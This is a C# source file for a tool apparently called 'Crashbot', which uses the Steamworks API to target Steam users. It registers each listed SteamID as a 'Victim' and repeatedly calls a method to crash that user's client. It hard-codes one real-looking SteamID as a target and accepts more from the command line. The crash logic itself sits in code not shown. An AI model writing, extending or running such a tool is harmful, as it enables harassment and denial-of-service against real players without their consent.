using Steamworks;
using System.Reflection;

namespace Crashbot
{
    internal class Program
    {
        private static ulong[] steamids = [
            76561198299556567,
            // 76561198422873503,
        ];

        private static readonly int MaxVerbosity = Enum.GetValues<Verbosity>().Cast<int>().Max();

        static void Main(string[] args)
        {
            Environment.CurrentDirectory = Directory.GetParent(AppContext.BaseDirectory)!.FullName;
            File.WriteAllText("steam_appid.txt", "387990");

            args = ["-v", "0", "-urmom", "123"];

            while (args.Length > 0)
            {
                int cnt = 2 % args.Length;
                var kvp = args.Take(cnt);
                args = args.Skip(cnt).ToArray();
                string key = kvp.ElementAtOrDefault(0).Trim();
                string value = kvp.ElementAtOrDefault(1).Trim();

                switch (key)
                {
                    case "-v":
                    case "--verbosity":
                        if (Enum.TryParse(value, true, out Verbosity v))
                            Console.LogVerbosity = v;
                        else if (int.TryParse(value, out int enm))
                            Console.LogVerbosity = (Verbosity)Math.Min(MaxVerbosity, Math.Abs(enm));
                        break;
                    case "-u":
                    case "--user":
                        steamids = [.. steamids, ulong.Parse(value)];
                        break;
                    case "-h":
                    case "--help":
                        Console.WriteLine("Usage: Crashbot [-v|--verbosity <verbosity>] [-u|--user <steamid64>] [-h|--help]", Verbosity.None);
                        Console.WriteLine("Verbosity levels: None = 0, Minimal = 1, Normal = 2, Verbose = 3, Debug = 4", Verbosity.None);
                        Console.WriteLine("Additional Users: There is no limit on how many users can be added via the cli", Verbosity.None);
                        return;
                }
            }

            SteamInterface Steam = SteamInterface.NewAsyncInterface();
            Steam.WaitUntilSteamReady();
            Console.Write(Environment.NewLine, Verbosity.Minimal);

            while (true)
            {
                AutoResetEvent Step = new(false);

                foreach (ulong sid in steamids)
                {
                    CSteamID originalUserSteamid = new(sid);
                    Victim A = new(originalUserSteamid);

                    Steam.AddNewVictim(A);
                    Steam.CrashVictimWhenReady(A);
                }

                Step.WaitOne();
            }
        }

        private static string ReadSteamId()
        {
            string steamid = Console.ReadLine()?.Trim() ?? string.Empty;

            if (string.IsNullOrEmpty(steamid))
                Console.WriteLine($"Invalid SteamID64", Verbosity.Minimal);

            if (steamid.Contains("http", StringComparison.InvariantCultureIgnoreCase))
                steamid = steamid.Split('/').Last();

            return steamid;
        }        
    }
}
